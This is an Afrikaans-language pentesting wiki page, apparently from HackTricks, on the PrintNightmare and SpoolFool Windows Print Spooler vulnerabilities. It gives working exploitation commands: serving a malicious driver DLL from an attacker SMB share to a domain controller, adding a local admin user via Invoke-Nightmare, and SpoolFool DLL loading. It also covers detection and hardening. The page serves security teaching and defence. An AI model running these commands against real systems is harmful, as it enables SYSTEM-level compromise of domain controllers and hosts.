# PrintNightmare (Windows Print Spooler RCE/LPE)

{{#include ../../banners/hacktricks-training.md}}

> PrintNightmare is die kollektiewe naam vir ’n familie kwesbaarhede in die Windows **Print Spooler**-diens wat **arbitrêre kode-uitvoering as SYSTEM** moontlik maak en, wanneer die spooler oor RPC bereikbaar is, **remote code execution (RCE) op domain controllers en file servers** moontlik maak. Die CVEs wat die meeste uitgebuit word, is **CVE-2021-1675** (aanvanklik as LPE geklassifiseer) en **CVE-2021-34527** (volledige RCE). Daaropvolgende kwessies soos **CVE-2021-34481 (“Point & Print”)** en **CVE-2022-21999 (“SpoolFool”)** bewys dat die attack surface steeds ver van gesluit is.

As jy op soek is na **authentication coercion / relay** via die spooler, eerder as **driver-based RCE/LPE**, kyk na [hierdie ander bladsy oor printer coercion abuse](printers-spooler-service-abuse.md). Hierdie bladsy fokus op die **laai van drivers / DLLs as SYSTEM**.

---

## 1. Kwesbare komponente & CVEs

| Jaar | CVE | Kort naam | Primitive | Notas |
|------|-----|------------|-----------|-------|
|2021|CVE-2021-1675|“PrintNightmare #1”|LPE|Gepatch in die Junie 2021 CU, maar omseil deur CVE-2021-34527|
|2021|CVE-2021-34527|“PrintNightmare”|RCE/LPE|`AddPrinterDriverEx` laat geauthentiseerde gebruikers toe om ’n driver DLL vanaf ’n remote share te laai; ná Augustus 2021 vereis dit gewoonlik verswakte Point & Print-beleide|
|2021|CVE-2021-34481|“Point & Print”|LPE|Unsigned driver-installasie deur nie-admingebruikers|
|2022|CVE-2022-21999|“SpoolFool”|LPE|Arbitrêre gids-skepping → DLL planting – werk ná die 2021-patches|

Almal misbruik een van die **MS-RPRN / MS-PAR RPC methods** (`RpcAddPrinterDriver`, `RpcAddPrinterDriverEx`, `RpcAsyncAddPrinterDriver`) of vertrouensverhoudings binne **Point & Print**.

## 2. Exploitation techniques

### 2.1 Remote Domain Controller compromise (CVE-2021-34527)

’n Geauthentiseerde maar **non-privileged** domain user kan arbitrêre DLLs as **NT AUTHORITY\SYSTEM** op ’n remote spooler (dikwels die DC) uitvoer deur:
```powershell
# 1. Host malicious driver DLL on a share the victim can reach
impacket-smbserver share ./evil_driver/ -smb2support

# 2. Use a PoC to call RpcAddPrinterDriverEx
python3 CVE-2021-1675.py victim_DC.domain.local  'DOMAIN/user:Password!' \
-f \
'\\attacker_IP\share\evil.dll'
```
Gewilde PoCs sluit **CVE-2021-1675.py** (Python/Impacket), **SharpPrintNightmare.exe** (C#) en Benjamin Delpy se `misc::printnightmare / lsa::addsid`-modules in **mimikatz** in.

### 2.2 Plaaslike privilege escalation (enige ondersteunde Windows, 2021-2024)

Dieselfde API kan **plaaslik** geroep word om ’n driver vanaf `C:\Windows\System32\spool\drivers\x64\3\` te laai en SYSTEM-privileges te verkry:
```powershell
Import-Module .\Invoke-Nightmare.ps1
Invoke-Nightmare -NewUser hacker -NewPassword P@ssw0rd!
```
### 2.3 Moderne triage op gepatchte hosts

Op 'n volledig opgedateerde host misluk openbare PrintNightmare PoCs dikwels omdat Windows nou by verstek **slegs administrateurs** toelaat om drukkerdrywers te installeer (`RestrictDriverInstallationToAdministrators=1` sedert 10 Augustus 2021). Voordat jy 'n exploit op 'n teiken uitvoer, moet jy eers nagaan of die omgewing daardie veiligheidsverandering vir legacy-drukkerontplooiings teruggerol het:
```cmd
reg query "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint"
```
Die twee interessantste swak waardes is gewoonlik:

- `RestrictDriverInstallationToAdministrators = 0`
- `NoWarningNoElevationOnInstall = 1`

Bevestig vanaf Linux vinnig dat die teiken die relevante print RPC-koppelvlakke blootstel voordat jy 'n PoC uitvoer:
```bash
rpcdump.py @TARGET | egrep 'MS-RPRN|MS-PAR'
```
Sommige nuwer publieke tooling bied jou ook ’n veiliger **check/list**-werkvloei voordat jy ’n DLL stuur:
```bash
python3 printnightmare.py -check 'DOMAIN/user:Password@TARGET'
python3 printnightmare.py -list  'DOMAIN/user:Password@TARGET'
```
> As jy `RPC_E_ACCESS_DENIED` (`0x8001011b`) as 'n lae-bevoorregte gebruiker kry, sien jy gewoonlik die verstekinstelling ná 2021 eerder as 'n transportfout.

> Op Windows 11 22H2+ en nuwer kliëntbouweergawes gebruik remote printing standaard **RPC over TCP**, en **RPC over named pipes** (`\PIPE\spoolss`) is gedeaktiveer tensy dit uitdruklik heraktiveer word. Sommige ouer PoC's en laboratoriumnotas neem steeds aan dat die named pipe bereikbaar is.

### 2.4 Package Point & Print-misbruik op “patched” netwerke

Baie enterprise-omgewings het ná die oorspronklike patches van 2021 **kwesbaar gebly weens beleid**, omdat helpdesk- of print-server-werkvloeie steeds vereis het dat nie-admingebruikers drivers installeer of bywerk. In die praktyk word die offensive playbook:

- As security prompts volledig gedeaktiveer is, is **classic arbitrary-DLL PrintNightmare** steeds die kortste pad.
- As `Only use Package Point and Print` geaktiveer is, moet jy gewoonlik oorskakel na 'n **signed package-aware driver**-pad eerder as 'n raw DLL drop.
- Navorsing in 2024 het getoon dat **`Package Point and Print - Approved servers` nie op sigself 'n harde trust boundary is nie**: as 'n aanvaller naamresolusie vir een approved print server kan spoof of hijack, kan slagoffers steeds herlei word na 'n malicious server wat aan die policy checks voldoen.
- Selfs die kombinasie van UNC-hardening met geforseerde RPC-over-SMB kan onbetroubaar wees, omdat moderne kliënte moontlik **fallback na RPC over TCP**.

Daarom gaan moderne PrintNightmare-styl exploitation dikwels meer oor **misbruik van enterprise-printer deployment policy** as om die oorspronklike 2021-PoC onveranderd te herhaal.

### 2.5 SpoolFool (CVE-2022-21999) – omseiling van die 2021-fixes

Microsoft se 2021-patches het remote driver loading geblokkeer, maar **het nie directory permissions gehard nie**. SpoolFool misbruik die `SpoolDirectory`-parameter om 'n arbitrêre directory onder `C:\Windows\System32\spool\drivers\` te skep, 'n payload-DLL daarin te plaas, en die spooler te dwing om dit te laai:
```powershell
# Binary version (local exploit)
SpoolFool.exe -dll add_user.dll

# PowerShell wrapper
Import-Module .\SpoolFool.ps1 ; Invoke-SpoolFool -dll add_user.dll
```
> Die exploit werk op volledig gepatchte Windows 7 → Windows 11 en Server 2012R2 → 2022 vóór die Februarie 2022-opdaterings

---

## 3. Opsporing & hunting

* **PrintService-logs** – aktiveer die *Microsoft-Windows-PrintService/Operational*-kanaal en monitor **Event ID 316** (drywer bygevoeg/bygewerk, sluit gewoonlik die DLL-name in) tydens beide suksesvolle en mislukte pogings. Kombineer dit met **Event ID 808/811** vir verdagte spooler-module-/drywerlaaifoute.
* **Sysmon** – `Event ID 7` (Image loaded) of `11/23` (File write/delete) binne `C:\Windows\System32\spool\drivers\*` wanneer die ouerproses **spoolsv.exe** is.
* **Proses-afkoms** – genereer ’n waarskuwing wanneer **spoolsv.exe** `cmd.exe`, `rundll32.exe`, PowerShell of enige onverwagte ongetekende child process voortbring.
* **Netwerktelemetrie** – onverwagte SMB-fetches vanaf `spoolsv.exe` na aanvaller-beheerde shares, of ongewone printer-RPC-verkeer vanaf servers wat nie as print servers behoort te funksioneer nie, is albei leidrade met ’n hoë seinwaarde.

## 4. Versagting & hardening

1. **Patch!** – Pas die nuutste kumulatiewe opdatering toe op elke Windows-host waarop die Print Spooler-service geïnstalleer is.
2. **Deaktiveer die spooler waar dit nie benodig word nie**, veral op Domain Controllers:
```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```
3. **Blokkeer remote connections** terwyl plaaslike printing steeds toegelaat word – Group Policy: `Computer Configuration → Administrative Templates → Printers → Allow Print Spooler to accept client connections = Disabled`.
4. **Hou Point & Print beperk tot administrators** deur die volgende in te stel:
```cmd
reg add "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint" \
/v RestrictDriverInstallationToAdministrators /t REG_DWORD /d 1 /f
```
Gedetailleerde leiding in Microsoft KB5005652
5. Indien besigheidsvereistes `RestrictDriverInstallationToAdministrators=0` afdwing, hanteer elke ander printer policy as slegs ’n **gedeeltelike versagting**. Verkies ten minste **package-aware drivers**, aktiveer **Only use Package Point and Print**, en beperk **Package Point and Print - Approved servers** tot uitdruklike in-forest print servers.
6. **Moenie printer RPC privacy terugrol** net om gebreekte printer mappings reg te stel nie. Omgewings wat `RpcAuthnLevelPrivacyEnabled=0` instel, maak hardening ongedaan wat vir **CVE-2021-1678** bygevoeg is en verdien gewoonlik ekstra ondersoek tydens ’n engagement.

---

## 5. Verwante navorsing / tools

* [mimikatz `printnightmare`](https://github.com/gentilkiwi/mimikatz/tree/master/modules) modules
* [`ly4k/PrintNightmare`](https://github.com/ly4k/PrintNightmare) – standaard Impacket-implementering met `-check`, `-list` en `-delete` modes
* [`m8sec/CVE-2021-34527`](https://github.com/m8sec/CVE-2021-34527) – wrapper met ingeboude SMB delivery, multi-target support en beide `MS-RPRN` / `MS-PAR` modes
* SharpPrintNightmare (C#) / Invoke-Nightmare (PowerShell)
* [`Concealed Position`](https://github.com/jacob-baines/concealed_position) – bring-your-own-vulnerable-printer-driver abuse deur package Point & Print
* SpoolFool exploit & write-up
* 0patch micropatches vir SpoolFool en ander spooler-bugs

As jy **authentication wil coerce** via die spooler in plaas daarvan om ’n drywer te laai, gaan na [misbruik van die printer spooler-service](printers-spooler-service-abuse.md).

---

## Verwysings

* Microsoft – *KB5005652: Bestuur nuwe Point & Print-standaardgedrag vir drywerinstallasie*
<https://support.microsoft.com/en-us/topic/kb5005652-manage-new-point-and-print-default-driver-installation-behavior-cve-2021-34481-873642bf-2634-49c5-a23b-6d8e9a302872>
* Oliver Lyak – *SpoolFool: CVE-2022-21999*
<https://github.com/ly4k/SpoolFool>
* itm4n – *’n Praktiese gids tot PrintNightmare in 2024*
<https://itm4n.github.io/printnightmare-exploitation/>
* itm4n – *Die PrintNightmare is nog nie verby nie*
<https://itm4n.github.io/printnightmare-not-over/>
{{#include ../../banners/hacktricks-training.md}}
